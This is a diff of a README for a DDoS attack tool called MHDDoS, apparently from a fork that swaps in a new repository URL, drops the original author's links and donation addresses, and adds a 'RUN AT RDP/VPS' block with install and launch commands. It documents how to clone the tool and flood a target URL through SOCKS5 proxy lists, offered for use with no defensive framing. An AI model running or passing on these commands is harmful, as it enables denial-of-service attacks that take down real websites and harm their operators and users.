@@ -1,3 +1,7 @@
+RUN AT RDP/VPS 
+```pip3 install -r requirements.txt```
+```python3 start.py bypass https://example.com 5 1000 socks5.txt 100 100```
+
 <p align="center"><img src="./screenshot/logo.ico" width="150px" height="150px" alt="aventium softworks"></p>
 
 <h1 align="center">MHDDoS - DDoS Attack Script With 36 Method</h1>
@@ -81,21 +85,10 @@ You can download from [GitHub Releases](https://github.com/MHProDev/MHDDoS/relea
 * scapy
 ---
 
-**Video's**
-
-* Aparat: https://www.aparat.com/v/bHcP9
-* YouTube : Coming soon..
-
-**toturial**
-
-* Aprat : https://aparat.com/v/XPn5Z
-* YouTube : https://youtu.be/mZilAOkLKK8
----
-
 **Clone and Install Script**
 
 ```console
-git clone https://github.com/MHProDev/MHDDoS.git
+git clone https://github.com/TsukasaCh/DDOS-ATT.git
 cd MHDDoS
 pip3 install -r requirements.txt
 ```
@@ -110,9 +103,4 @@ python3 start.py bypass https://example.com 5 1000 socks5.txt 100 100
 ```
 
 [python3]: https://python.org 'Python3'
-[github]: https://github.com/MHProDev/MHDDoS/issues 'GitHub'
-
-**💰 Donate:**
-* https://idpay.ir/mh-prodev
-* bitcoincash:qrwytj0aghszlqmfnku2h5ms4fad567ueg5g9dn2nu
-
+[github]: https://github.com/TsukasaCh/DDOS-ATT/issues 'GitHub'
